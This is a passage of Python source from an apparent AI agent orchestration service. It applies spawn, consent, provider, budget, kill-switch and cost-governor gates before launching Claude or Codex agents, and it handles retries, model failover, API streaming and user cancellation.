    # audit there (the budget cap + killswitch below still bound spend/liveness). Fail-closed on a real
    # deny we could read; fail-open on lost machinery — never brick legitimate liveness.
    try:
        manifest = governance.load_manifest(spawner_role)
        if not manifest:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="spawn-gate-failopen",
                         payload={"spawner": spawner_role, "reason": "manifest missing/unreadable"})
        else:
            governance.enforce(spawner_role, "spawn")   # raises PermissionError + audits 'GovernanceDenied'
    except PermissionError:
        return {"rc": -1, "failed": True, "out": "spawn denied",
                "blocker": f"role '{spawner_role}' is not permitted to spawn sub-agents (can_spawn is "
                           f"false in its manifest) — escalate for an approval or role change"}
    except Exception as e:                               # governance infra error -> fail OPEN + audit
        try:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="spawn-gate-failopen", payload={"spawner": spawner_role, "error": str(e)[:200]})
        except Exception:
            pass
    # CONSENT BACKSTOP (EU AI Act Art.50 / Apple 5.1.2(i) / Play AI policy): never send a tenant's text to
    # the model before NAMED AI-processing consent is on file. Front doors gate this up front (research.start,
    # loopcontroller.say, orchestrator.confirm); this is the defense-in-depth chokepoint so a caller that
    # forgets to gate (e.g. the controller's conversational _llm) still can't leak pre-consent text. Only
    # enforced when a tenant is in context (_ctx.tenant): platform/internal builds and the offline selftest
    # set no tenant -> not gated (higher layers bound the build line; bricking every agent on a missing-tenant
    # gap is the wrong trade — mirrors the spawn-gate fail-open above). Fail OPEN on consent-infra error (a DB
    # hiccup shouldn't wedge the fleet); a clean, readable 'no consent on file' for a known tenant fails CLOSED.
    _tenant = getattr(_ctx, "tenant", None)
    if _tenant:
        try:
            import consent
            _consented = consent.require_consent(_tenant)
        except Exception:
            _consented = True
        if not _consented:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="consent-required", payload={"tenant": _tenant, "spawner": spawner_role})
            return {"rc": -1, "failed": True, "out": "consent required", "blocker": "consent_required",
                    "reason": "AI-processing consent is not on file for this tenant — accept it in Settings, then retry"}
    # PROVIDER BACKSTOP (symmetric to the consent backstop above; keyed on the same _ctx.tenant): never run
    # a TENANT's work on the PLATFORM's own model credentials. When a tenant is in context they must have a
    # resolved provider on file — a connected BYO key OR a subscription login. auth.provider_resolved accepts
    # auth_mode='subscription' as resolved, so a subscription login is NEVER blocked; nothing connected (or an
    # api_key connection whose vault secret went missing) is refused here rather than silently billing the
    # platform. Front doors gate this up front (loopcontroller.say / orchestrator); this is the defense-in-
    # depth chokepoint so a caller that forgets still can't spend platform credit on tenant work. Only fires
    # when _ctx.tenant is set (platform/internal builds + the offline selftest set none -> not gated), and
    # auth.provider_resolved already fails OPEN on resolver-infra error so a DB/vault hiccup can't wedge the
    # fleet — a clean 'no provider on file' fails CLOSED.
    if _tenant:
        try:
            import auth
            _resolved = auth.provider_resolved(_tenant)
        except Exception:
            _resolved = True
        if not _resolved:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="provider-required", payload={"tenant": _tenant, "spawner": spawner_role})
            return {"rc": -1, "failed": True, "out": "provider required", "blocker": "provider_required",
                    "reason": "no model provider is connected for this tenant — connect a key or a "
                              "subscription login in Providers, then retry"}
    if BUDGET_USD and spent_usd() >= BUDGET_USD:      # BUDGET cap: stop spawning new work, escalate
        return {"rc": -1, "failed": True, "out": "budget exhausted",
                "blocker": f"factory budget ${BUDGET_USD:.2f} exhausted (${spent_usd():.2f} spent) — raise AOS_BUDGET_USD or split the work"}
    _halt = killswitch.is_halted(getattr(_ctx, "product", None) or "global")  # runtime human-oversight stop
    if _halt.get("halted"):                           # operator / EU-AI-Act kill-switch: refuse next spawn
        return {"rc": -1, "failed": True, "out": "halted",
                "blocker": f"fleet HALTED by operator (scope={_halt.get('scope')}): {_halt.get('reason')} — resume with killswitch.py resume"}
    _prod = getattr(_ctx, "product", None)            # MONEY CIRCUIT-BREAKER (C4): the per-app spend/loss cap
    if _prod:                                          # must FIRE mid-build, not just an hourly sweep after the fact
        try:
            import appguard
            _ab = appguard.blocks(_prod)
        except Exception:
            _ab = None
        if _ab:
            return {"rc": -1, "failed": True, "out": "app circuit-breaker",
                    "blocker": f"'{_prod}' hit its spend circuit-breaker ({_ab}) — auto-paused; raise the "
                               f"cap or resume it in Approvals before more spend"}
    # RUNTIME COST GOVERNOR (ADR 0002): enforce the per-product HARD token cap before every dispatch.
    # budget.allow_spend denies (and audits) when this product's configured token_budget would be blown
    # with hard_stop on — we refuse the dispatch and escalate rather than burn past the cap. No budget set
    # for the product -> it allows (this only bites tenants who opted into a hard cap). On a governor-infra
    # error we fail OPEN: the soft USD cap above + the killswitch still bound spend, and blocking every
    # build because the budgets DB hiccuped would break the whole factory's liveness.
    product = getattr(_ctx, "product", None)
    if product:
        est_tokens = len(role_brief(role)) // 4 + len(task) // 4 + 8000  # prompt-in estimate + output allowance
        try:
            import budget as _budget
            allowed = _budget.allow_spend(product, est_tokens)
        except Exception:
            allowed = True
        if not allowed:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="budget-denied", payload={"product": product, "est_tokens": est_tokens})
            return {"rc": -1, "failed": True, "out": "token budget exhausted",
                    "blocker": f"product '{product}' token budget exhausted (governor hard_stop) — "
                               f"raise it with `budget.py set {product} <tokens>` or split the work"}
    # NB: no home-grown context handling — the agent CLI (claude/codex) manages its own context window
    # (agentic file search, on-demand reads, compaction) far better than a bolt-on retrieval layer would.
    if light:
        # CONVERSATIONAL FAST PATH: the caller's `task` is already a self-contained system+context+conversation
        # prompt (see loopcontroller._llm), so the heavyweight elite role charter is pure latency. Add only a
        # one-line identity + a "be quick" instruction — a clarifying reply must feel near-instant.
        prompt = (f"You are the {role}, replying live in a chat with a non-technical CEO. Be warm, concise, and "
                  f"helpful; answer directly without preamble.\n\n{task}")
    else:
        # MEMORY SPINE (REBUILD-PLAN A3): the brief carries the elite role charter PLUS this company's
        # memory (decisions/preferences/history) + this role's hard-won lessons — so a spawned agent is not
        # a blank slate that "remembers nothing from yesterday". Best-effort: memory must never block a spawn.
        mem = ""
        try:
            import companymemory
            mem = companymemory.brief_context(getattr(_ctx, "tenant", None), getattr(_ctx, "org", None), role)
        except Exception:
            mem = ""
        cap = ""
        try:
            import skills
            cap = skills.brief_for(role)              # A4: the role's READY capabilities + tools (was unconsumed)
        except Exception:
            cap = ""
        prompt = f"{role_brief(role)}{cap}{mem}\n\nTASK:\n{task}\n\nWork now; create/edit files directly."
    # MULTI-PROVIDER: a tenant may have ONLY a Codex/OpenAI key (no Claude). Route them to Codex as the
    # PRIMARY engine (not just failover), on their own key. Default stays Claude.
    engine = (getattr(_ctx, "engine", None) or "claude").lower()
    if engine == "codex" and shutil.which("codex"):
        return _agent_codex(role, repo, prompt, getattr(_ctx, "codex_key", None))
    env = None
    key = getattr(_ctx, "api_key", None)
    if key:
        env = {**os.environ, "ANTHROPIC_API_KEY": key}
    # LATENCY: a BYO-key light turn (clarify/say/plan-draft) hits the Messages API over a WARM, pooled HTTP
    # connection instead of cold-spawning `claude` — first token in well under a second. All gates above have
    # already passed and a conversational reply uses no tools, so nothing is lost. Any failure (bad key handled
    # by the caller) falls through to the proven CLI path below.
    if light and key and engine == "claude" and _anthropic_available():
        # NB: a warm-HTTP call is a lightweight request, NOT a ~430MB subprocess, so it does NOT take the
        # _AGENT_SEM slot — a chat reply must not queue behind heavy build agents (that's the latency we kill).
        api_timeout = timeout or int(os.environ.get("AOS_CHAT_TIMEOUT", "90"))
        try:
            rc, out_text, cost, tin, tout, used = _api_once(prompt, model, key, api_timeout)
        except Exception:
            rc, out_text, cost, tin, tout, used = 1, "", 0.0, 0, 0, model   # unexpected -> CLI path below
        if "Invalid API key" in (out_text or ""):    # bad BYO key -> surface exactly like the CLI path
            _trace("agent", role, prompt, out_text, rc, None, cost, tin, tout, used)
            return {"rc": rc, "out": out_text[-1500:], "out_full": out_text, "failed": True, "reason": "invalid BYO key"}
        if rc == 0 and (out_text or "").strip():
            _add_spend(cost)
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="executed", payload={"rc": 0, "engine": "api", "cost_usd": cost, "model": used})
            _trace("agent", role, prompt, out_text, 0, None, cost, tin, tout, used)
            return {"rc": 0, "out": out_text[-1500:], "out_full": out_text, "cost_usd": cost, "tokens_in": tin,
                    "tokens_out": tout, "attempts": 1, "model": used, "engine": "api"}
        # else fall through to the CLI fast path below
    if light:                                        # fast path: NO estimate handshake (it's a 2nd claude
        if timeout is None:                          # process — the very latency we're killing). Fixed short
            timeout = int(os.environ.get("AOS_CHAT_TIMEOUT", "90"))   # budget; a quick chat reply is seconds.
        if retries is None:
            retries = 0
    if timeout is None or retries is None:
        with _AGENT_SEM:                             # the estimate is also a claude process — cap it too
            est_min, est_ret = _estimate_runtime(role, task, env)
        if timeout is None:
            timeout = int(est_min * 60 * 1.5)        # callee's estimate × 1.5 safety
        if retries is None:
            retries = est_ret
        _trace("estimate", role, f"callee estimate for: {task[:120]}",
               f"~{est_min} min, {est_ret} retries -> timeout {timeout}s", 0)
    last = {"rc": -1, "out": ""}
    saw_transient = False                            # did any attempt fail on overload/timeout (outage)?
    exhausted_primary = False                         # did the pinned model hit its subscription usage cap?
    for attempt in range(retries + 1):
        t0 = time.time()
        try:
            with _AGENT_SEM:                          # global cap on concurrent agent subprocesses
                rc, out_text, cost, tin, tout, used = _run_once(role, repo, prompt, timeout, env, model, tools)
        except subprocess.TimeoutExpired:
            dt = round(time.time() - t0, 1)
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="timeout", payload={"attempt": attempt + 1, "timeout_s": timeout})
            _trace("agent", role, prompt, f"TIMEOUT after {timeout}s (attempt {attempt + 1}/{retries + 1})", -1, dt, model=model)
            time.sleep(4 * (attempt + 1))
            timeout = min(900, int(timeout * 1.5))      # back off: give it more time next try
            last = {"rc": -1, "out": "timeout"}
            saw_transient = True                        # a hung/overloaded provider counts as transient
            continue
        dt = round(time.time() - t0, 1)
        _add_spend(cost)                                # running total for the budget cap
        audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                     decision="executed", payload={"rc": rc, "attempt": attempt + 1, "cost_usd": cost, "model": used})
        _trace("agent", role, prompt, out_text, rc, dt, cost, tin, tout, used)
        if key and "Invalid API key" in out_text:       # bad BYO key — don't waste retries
            return {"rc": rc, "out": out_text[-1500:], "out_full": out_text, "failed": True, "reason": "invalid BYO key"}
        if rc == 0 and out_text.strip():
            # 'out' stays tail-truncated for compact previews/logs; 'out_full' carries the COMPLETE text so
            # callers parsing leading control blocks ([[PLAN]]/[[RESEARCH]]) never lose the opening marker.
            return {"rc": 0, "out": out_text[-1500:], "out_full": out_text, "cost_usd": cost, "tokens_in": tin,
                    "tokens_out": tout, "attempts": attempt + 1, "model": used}
        last = {"rc": rc, "out": out_text}
        if any(t in (out_text or "").lower() for t in _MODEL_EXHAUSTED) and model != FALLBACK_MODEL:
            exhausted_primary = True                    # subscription cap on the pinned model -> switch, don't retry it
            break
        transient = any(t in (out_text or "").lower() for t in _TRANSIENT)
        saw_transient = saw_transient or transient
        time.sleep((8 if transient else 4) * (attempt + 1))   # longer backoff on rate-limit/overload
    # MODEL-EXHAUSTION FAILOVER — the pinned model (e.g. Fable 5) hit its SUBSCRIPTION usage cap, which
    # --fallback-model does NOT cover. Retry the SAME task once on the FALLBACK_MODEL (a different quota, e.g.
    # Opus) before giving up. If the fallback is ALSO capped, saw_transient lets the Codex failover try next.
    if exhausted_primary:
        _note_exhausted(model)             # remember it so the rest of the fleet skips this capped model (cooldown)
        _trace("agent", role, prompt, f"{model} hit its usage limit — switching to {FALLBACK_MODEL}", -1, model=model)
        audit.append(actor=f"factory:{role}", action="AgentModelSwitch", resource=Path(repo).name,
                     decision="exhausted", payload={"from": model, "to": FALLBACK_MODEL})
        try:
            with _AGENT_SEM:
                rc, out_text, cost, tin, tout, used = _run_once(role, repo, prompt, timeout, env, FALLBACK_MODEL, tools)
            _add_spend(cost)
            _trace("agent", role, prompt, out_text, rc, 0.0, cost, tin, tout, used)
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="executed-modelswitch", payload={"rc": rc, "model": used})
            if rc == 0 and out_text.strip():
                return {"rc": 0, "out": out_text[-1500:], "out_full": out_text, "cost_usd": cost,
                        "tokens_in": tin, "tokens_out": tout, "attempts": retries + 2, "model": used}
            last = {"rc": rc, "out": out_text}
            saw_transient = True                        # fallback also failed/capped -> allow Codex failover
        except subprocess.TimeoutExpired:
            saw_transient = True
    # PROVIDER FAILOVER — Claude exhausted its retries on transient/overload/timeout (Anthropic likely
    # degraded or down): run the SAME task once on Codex before giving up. Tenant Claude runs only fall
    # over to that tenant's connected OpenAI/Codex provider; platform/internal runs use host Codex auth.
    codex_env, codex_source = _codex_fallback_env()
    if saw_transient and codex_env is not None:
        print(f"[factory] Claude exhausted on transient errors — failing over to Codex for {role}", flush=True)
        try:
            with _AGENT_SEM:
                rc, out_text, cost, tin, tout, used = _run_once_codex(role, repo, prompt, timeout, codex_env)
            _trace("agent", role, prompt, out_text, rc, 0.0, cost, tin, tout, used)
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="executed-failover",
                         payload={"engine": "codex", "rc": rc, "model": used, "source": codex_source})
            if rc == 0 and out_text.strip():
                try:
                    import notify
                    notify.send(f"↪ failover: '{role}' ran on Codex (Anthropic degraded) for {Path(repo).name}",
                                title="factory", tags="arrows_counterclockwise")
                except Exception:
                    pass
                return {"rc": 0, "out": out_text[-1500:], "out_full": out_text, "cost_usd": cost, "tokens_in": tin,
                        "tokens_out": tout, "attempts": retries + 1, "model": used, "engine": "codex"}
            last = {"rc": rc, "out": out_text}
        except subprocess.TimeoutExpired:
            last = {"rc": -1, "out": "codex fallback timeout"}
        except Exception as e:
            _trace("agent", role, prompt, f"codex fallback error: {e}", -1)
    try:                                                # exhausted -> escalate, don't die silently
        import notify
        notify.send(f"⚠ agent '{role}' failed after {retries + 1} attempts on {Path(repo).name}",
                    title="factory", priority="high", tags="warning")
    except Exception:
        pass
    return {"rc": last["rc"], "out": (last["out"] or "")[-1500:], "out_full": last["out"] or "",
            "failed": True, "attempts": retries + 1}


def _chat_gates(spawner_role, role, repo, task):
    """The SAME safety chokepoints agent() enforces inline (spawn / consent / provider / budget /
    killswitch / runtime cost governor), factored out so the STREAMING conversational path (agent_stream)
    can't bypass any of them. Returns a blocker dict (identical shape to agent()'s refusals) when a gate
    denies, else None. Mirrors agent()'s fail-open-on-infra / fail-closed-on-clean-deny posture exactly."""
    try:
        manifest = governance.load_manifest(spawner_role)
        if not manifest:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="spawn-gate-failopen",
                         payload={"spawner": spawner_role, "reason": "manifest missing/unreadable"})
        else:
            governance.enforce(spawner_role, "spawn")
    except PermissionError:
        return {"rc": -1, "failed": True, "out": "spawn denied",
                "blocker": f"role '{spawner_role}' is not permitted to spawn sub-agents (can_spawn is "
                           f"false in its manifest) — escalate for an approval or role change"}
    except Exception as e:
        try:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="spawn-gate-failopen", payload={"spawner": spawner_role, "error": str(e)[:200]})
        except Exception:
            pass
    _tenant = getattr(_ctx, "tenant", None)
    if _tenant:
        try:
            import consent
            _consented = consent.require_consent(_tenant)
        except Exception:
            _consented = True
        if not _consented:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="consent-required", payload={"tenant": _tenant, "spawner": spawner_role})
            return {"rc": -1, "failed": True, "out": "consent required", "blocker": "consent_required",
                    "reason": "AI-processing consent is not on file for this tenant — accept it in Settings, then retry"}
        try:
            import auth
            _resolved = auth.provider_resolved(_tenant)
        except Exception:
            _resolved = True
        if not _resolved:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="provider-required", payload={"tenant": _tenant, "spawner": spawner_role})
            return {"rc": -1, "failed": True, "out": "provider required", "blocker": "provider_required",
                    "reason": "no model provider is connected for this tenant — connect a key or a "
                              "subscription login in Providers, then retry"}
    if BUDGET_USD and spent_usd() >= BUDGET_USD:
        return {"rc": -1, "failed": True, "out": "budget exhausted",
                "blocker": f"factory budget ${BUDGET_USD:.2f} exhausted (${spent_usd():.2f} spent) — raise AOS_BUDGET_USD or split the work"}
    _halt = killswitch.is_halted(getattr(_ctx, "product", None) or "global")
    if _halt.get("halted"):
        return {"rc": -1, "failed": True, "out": "halted",
                "blocker": f"fleet HALTED by operator (scope={_halt.get('scope')}): {_halt.get('reason')} — resume with killswitch.py resume"}
    product = getattr(_ctx, "product", None)
    if product:
        est_tokens = len(task) // 4 + 8000
        try:
            import budget as _budget
            allowed = _budget.allow_spend(product, est_tokens)
        except Exception:
            allowed = True
        if not allowed:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="budget-denied", payload={"product": product, "est_tokens": est_tokens})
            return {"rc": -1, "failed": True, "out": "token budget exhausted",
                    "blocker": f"product '{product}' token budget exhausted (governor hard_stop) — "
                               f"raise it with `budget.py set {product} <tokens>` or split the work"}
    return None


class StreamStopped(Exception):
    """Raised by an on_delta sink (or surfaced by a cancel predicate) to mean 'the client is gone / the CEO
    hit Stop'. It's the cancellation signal that lets a streaming turn ACTUALLY terminate its worker and be
    discarded — never persisted — instead of running to completion and landing a late, unwanted reply."""


# WARM HTTP for BYO-key light turns. A pure conversational reply (clarify/say/plan-draft chat) does not need
# the ~1-2s `claude` CLI cold-spawn (node boot + auth) at all: when the tenant brought their own Anthropic
# key we hit the Messages API directly over a POOLED, keep-alive HTTP connection via the official SDK, so the
# first token arrives in well under a second. One client per key (module-level cache) keeps the TCP/TLS
# connection warm across turns. Subscription tenants (OAuth login, no API key) still use the CLI path below.
_API_CLIENTS = {}
_API_CLIENTS_LOCK = threading.Lock()
# Per-1M-token (input, output) list price for the models the fast path uses — to report honest cost on the
# API path (the CLI reports total_cost_usd for us; the raw API does not). Cache reads bill ~0.1x, writes ~1.25x.
_PRICES = {"claude-haiku-4-5": (1.0, 5.0), "claude-sonnet-4-6": (3.0, 15.0),
           "claude-opus-4-8": (5.0, 25.0), "claude-opus-4-7": (5.0, 25.0),
           "claude-fable-5": (5.0, 25.0)}   # opus-tier estimate; CLI paths report real total_cost_usd


def _anthropic_available() -> bool:
    try:
        import anthropic  # noqa: F401
        return True
    except Exception:
        return False


def _anthropic_client(api_key):
    """One pooled anthropic.Anthropic per key — reused across turns so the HTTP connection stays warm."""
    import anthropic
    with _API_CLIENTS_LOCK:
        c = _API_CLIENTS.get(api_key)
        if c is None:
            c = anthropic.Anthropic(api_key=api_key, max_retries=2)
            _API_CLIENTS[api_key] = c
        return c


def _api_cost(model, tin, tout, cache_r=0, cache_c=0):
    rin, rout = next((v for k, v in _PRICES.items() if (model or "").startswith(k)), (1.0, 5.0))
    return (tin * rin + cache_r * rin * 0.1 + cache_c * rin * 1.25 + tout * rout) / 1e6


def _chat_max_tokens():
    return int(os.environ.get("AOS_CHAT_MAX_TOKENS", "4096"))


def _api_once(prompt, model, api_key, timeout):
    """Non-streaming BYO-key light turn over the warm HTTP client. Returns _run_once's tuple shape."""
    import anthropic
    client = _anthropic_client(api_key)
    try:
        msg = client.with_options(timeout=float(timeout)).messages.create(
            model=model, max_tokens=_chat_max_tokens(),
            messages=[{"role": "user", "content": prompt}])
    except anthropic.AuthenticationError:
        return 1, "Invalid API key", 0.0, 0, 0, model     # signal a bad BYO key exactly like the CLI path
    except Exception as e:
        return 1, f"api error: {str(e)[:200]}", 0.0, 0, 0, model
    text = "".join(getattr(b, "text", "") for b in msg.content if getattr(b, "type", "") == "text")
    u = msg.usage
    cache_r = int(getattr(u, "cache_read_input_tokens", 0) or 0)
    cache_c = int(getattr(u, "cache_creation_input_tokens", 0) or 0)
    tin, tout = int(u.input_tokens), int(u.output_tokens)
    used = getattr(msg, "model", None) or model
    return 0, text, _api_cost(used, tin, tout, cache_r, cache_c), tin + cache_r + cache_c, tout, used


def _stream_api(role, prompt, model, on_delta, api_key, timeout, cancel=None):
    """Stream a light turn straight from the Messages API over the warm HTTP client. Invokes on_delta(text)
    per token; returns (rc, full_text, cost, tin, tout, used, cancelled). CANCELLATION is real: if `cancel()`
    goes true or on_delta raises (dead client / CEO hit Stop) or the wall-clock deadline passes, we CLOSE the
    HTTP stream immediately, stop emitting, and return cancelled=True — no late reply. Thinking is left off
    (haiku default) so the first visible token isn't stuck behind a hidden reasoning pass. Never raises."""
    import anthropic
    client = _anthropic_client(api_key)
    parts, cancelled, rc, used = [], False, 0, model
    tin = tout = cache_r = cache_c = 0
    deadline = time.time() + float(timeout or 90)
    try:
        with client.with_options(timeout=float(timeout or 90)).messages.stream(
                model=model, max_tokens=_chat_max_tokens(),
                messages=[{"role": "user", "content": prompt}]) as stream:
            for text in stream.text_stream:
                if (cancel and cancel()) or time.time() > deadline:
                    cancelled = True
                    stream.close()
                    break
                if not text:
                    continue
                parts.append(text)
                try:
                    on_delta(text)
                except Exception:               # a raising sink means the client is gone -> cancel, don't finish
                    cancelled = True
                    stream.close()
                    break
            if not cancelled:
                final = stream.get_final_message()
                u = final.usage
                tin, tout = int(u.input_tokens), int(u.output_tokens)
                cache_r = int(getattr(u, "cache_read_input_tokens", 0) or 0)
                cache_c = int(getattr(u, "cache_creation_input_tokens", 0) or 0)
                used = getattr(final, "model", None) or model
    except anthropic.AuthenticationError:
        return 1, "Invalid API key", 0.0, 0, 0, model, False
    except Exception:
        rc = 1                                  # partial `parts` (if any) is returned; caller decides fallback
    cost = _api_cost(used, tin, tout, cache_r, cache_c)
    return rc, "".join(parts), cost, tin + cache_r + cache_c, tout, used, cancelled


def _run_once_stream(role, repo, prompt, timeout, env, model, on_delta, tools=None, cancel=None, light=False):
    """Like _run_once but with `--output-format stream-json`: invokes on_delta(text) for each user-visible
    text token as it arrives, then returns (rc, full_text, cost, tin, tout, used, cancelled). Extended
    THINKING is disabled (MAX_THINKING_TOKENS=0) so the FIRST visible token isn't stuck behind a hidden
    reasoning pass — the whole point of a chat fast path.
    CANCELLATION: if `cancel()` goes true or on_delta raises (client gone / CEO hit Stop), we KILL the
    subprocess at once and return cancelled=True with no further tokens — the run does NOT complete and the
    caller must NOT persist it. (Pre-fix bug: on_delta exceptions were swallowed, so a Stopped stream ran to
    completion and its late reply was still persisted ~10s after 'Stopped'.)
    TRIM: for a light chat turn (`light=True`, no tools) we skip the per-role governance/manifest wiring the
    conversational reply never uses and instead statically deny mutation tools (a chat reply must not write
    files) — cheaper per call than loading the role manifest, and just as safe."""
    cmd = ["claude", "-p", prompt, "--permission-mode", "acceptEdits",
           "--output-format", "stream-json", "--include-partial-messages", "--verbose",
           "--model", model, "--fallback-model", FALLBACK_MODEL]
    grant = tools if tools is not None else _role_tools(role)
    if grant:
        cmd += ["--allowedTools", *grant]
    _cfg = _agent_config_dir()                        # isolate from the dev's bypassPermissions settings
    if light:
        # A conversational reply uses no tools; a static deny of the mutation/spawn tools is correct AND
        # avoids loading the role manifest + governance on the hot chat path.
        cmd += ["--disallowedTools", "Edit", "Write", "MultiEdit", "NotebookEdit", "Bash", "Task"]
        genv = {**(env or os.environ), "MAX_THINKING_TOKENS": "0"}
        if _cfg:
            genv["CLAUDE_CONFIG_DIR"] = _cfg
    else:
        restr = governance.spawn_restrictions(role)
        disallow = list(restr["disallowed_tools"]) + [f"Read({g})" for g in restr["deny_read"]]
        if disallow:
            cmd += ["--disallowedTools", *disallow]
        mpath = ROLES / f"{role}.yaml"
        genv = {**(env or os.environ), "MAX_THINKING_TOKENS": "0"}
        if _cfg:
            genv["CLAUDE_CONFIG_DIR"] = _cfg
        if mpath.exists():
            genv["CP_MANIFEST"] = str(mpath); genv["CP"] = str(CONTROL_PLANE)
    parts, result_text, cost, tin, tout, used, rc, cancelled = [], "", 0.0, 0, 0, model, 0, False
    p = subprocess.Popen(cmd, cwd=repo, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                         text=True, bufsize=1, env=genv)
    timer = threading.Timer(timeout, p.kill); timer.start()   # hard wall-clock cap (mirrors _run_once timeout)
    try:
        for line in p.stdout:
            if cancel and cancel():                          # cooperative cancel between tokens
                cancelled = True
                break
            line = line.strip()
            if not line:
                continue
            try:
                o = json.loads(line)
            except Exception:
                continue
            t = o.get("type")
            if t == "stream_event":
                e = o.get("event", {})
                if e.get("type") == "content_block_delta" and (e.get("delta") or {}).get("type") == "text_delta":
                    txt = e["delta"].get("text") or ""
                    if txt:
                        parts.append(txt)
                        try:
                            on_delta(txt)
                        except Exception:        # a raising sink means the client is gone -> cancel + kill
                            cancelled = True
                            break
            elif t == "result":
                result_text = o.get("result", "") or result_text
                cost = float(o.get("total_cost_usd") or 0)
                u = o.get("usage") or {}
                tin = int(u.get("input_tokens", 0)) + int(u.get("cache_read_input_tokens", 0)) + int(u.get("cache_creation_input_tokens", 0))
                tout = int(u.get("output_tokens", 0))
                if o.get("is_error"):
                    rc = 1
    finally:
        timer.cancel()
        if cancelled:
            p.kill()                                          # ACTUALLY terminate — no late tokens, no late reply
        rc2 = p.wait()
        if rc == 0 and not cancelled:
            rc = rc2
    if not cancelled:
        _govern_writes(role, repo)
    full = "".join(parts) or result_text     # streamed deltas are authoritative; fall back to the result text
    return rc, full, cost, tin, tout, used, cancelled


def _cancelled_result():
    """The uniform 'this streaming turn was Stopped' dict. failed=True keeps the caller from treating it as a
    real reply; cancelled=True lets the caller DISCARD it (never persist) rather than fall back and re-run."""
    return {"rc": -1, "failed": True, "cancelled": True, "out": "", "out_full": "", "reason": "cancelled by user"}


def agent_stream(role: str, repo: str, task: str, on_delta, timeout: int = None,
                 tools: list = None, spawner: str = None, cancel=None) -> dict:
    """STREAMING sibling of agent(light=True) for QUICK CONVERSATIONAL turns (the controller's clarify/scope/
    plan-draft chat). Streams text tokens to on_delta(text) as they arrive (token-by-token, like ChatGPT/Claude)
    and returns the SAME dict shape as agent() so the caller treats the result identically. Runs ALL the same
    safety gates (via _chat_gates) and the FAST model + minimal preamble + no estimate handshake.

    LATENCY: a BYO-key tenant streams straight from the Messages API over a WARM, pooled HTTP connection
    (first token in well under a second, no CLI cold-spawn); everyone else uses the trimmed CLI stream path.
    STOP: `cancel` (optional predicate) OR an on_delta that raises means the CEO hit Stop / the client is gone —
    the worker (HTTP stream or subprocess) is terminated immediately and _cancelled_result() is returned so the
    turn is DISCARDED, never persisted. On any non-cancel error a {failed:True} dict lets the caller fall back to
    the proven blocking agent() path — a streamed reply must never be worse than the non-stream one."""
    model = CHEAP_MODEL
    _apply_scale()
    spawner_role = spawner or getattr(_ctx, "spawner", None) or "controller"
    block = _chat_gates(spawner_role, role, repo, task)
    if block:
        return block
    engine = (getattr(_ctx, "engine", None) or "claude").lower()
    if engine == "codex":                                  # no token stream on the Codex path -> caller falls back
        return {"rc": -1, "failed": True, "out": "", "reason": "stream unsupported on codex engine"}
    key = getattr(_ctx, "api_key", None)
    if timeout is None:
        timeout = int(os.environ.get("AOS_CHAT_TIMEOUT", "90"))
    prompt = (f"You are the {role}, replying live in a chat with a non-technical CEO. Be warm, concise, and "
              f"helpful; answer directly without preamble.\n\n{task}")

    # WARM-HTTP FAST PATH (BYO key): stream over the pooled Messages-API connection — no CLI cold-spawn.
    # Falls through to the CLI stream ONLY when nothing was emitted yet, so on_delta never sees duplicate tokens.
    if key and _anthropic_available():
        t0 = time.time()
        rc, out_text, cost, tin, tout, used, cancelled = _stream_api(role, prompt, model, on_delta, key, timeout, cancel)
        dt = round(time.time() - t0, 1)
        if cancelled:
            audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                         decision="cancelled", payload={"engine": "api", "stream": True})
            _trace("agent", role, prompt, (out_text or "")[:2000] + "\n[CANCELLED]", -1, dt, cost, tin, tout, used)
            return _cancelled_result()
        _add_spend(cost)
        audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                     decision="executed", payload={"rc": rc, "engine": "api", "stream": True, "cost_usd": cost, "model": used})
        _trace("agent", role, prompt, out_text, rc, dt, cost, tin, tout, used)
        if key and "Invalid API key" in out_text:
            return {"rc": rc, "out": out_text[-1500:], "out_full": out_text, "failed": True, "reason": "invalid BYO key"}
        if rc == 0 and out_text.strip():
            return {"rc": 0, "out": out_text[-1500:], "out_full": out_text, "cost_usd": cost, "tokens_in": tin,
                    "tokens_out": tout, "attempts": 1, "model": used, "streamed": True, "engine": "api"}
        if out_text:                                       # streamed partial then errored -> don't re-stream (dup)
            return {"rc": rc or 1, "out": out_text[-1500:], "out_full": out_text, "failed": True,
                    "reason": "stream errored mid-reply"}
        # nothing emitted -> safe to fall through to the CLI stream below

    env = {**os.environ, "ANTHROPIC_API_KEY": key} if key else None
    t0 = time.time()
    try:
        with _AGENT_SEM:
            rc, out_text, cost, tin, tout, used, cancelled = _run_once_stream(
                role, repo, prompt, timeout, env, model, on_delta, tools, cancel, light=True)
    except Exception as e:
        return {"rc": -1, "failed": True, "out": "", "reason": f"stream error: {str(e)[:160]}"}
    dt = round(time.time() - t0, 1)
    if cancelled:
        audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                     decision="cancelled", payload={"engine": "claude", "stream": True})
        _trace("agent", role, prompt, (out_text or "")[:2000] + "\n[CANCELLED]", -1, dt, cost, tin, tout, used)
        return _cancelled_result()
    _add_spend(cost)
    audit.append(actor=f"factory:{role}", action="AgentRun", resource=Path(repo).name,
                 decision="executed", payload={"rc": rc, "stream": True, "cost_usd": cost, "model": used})
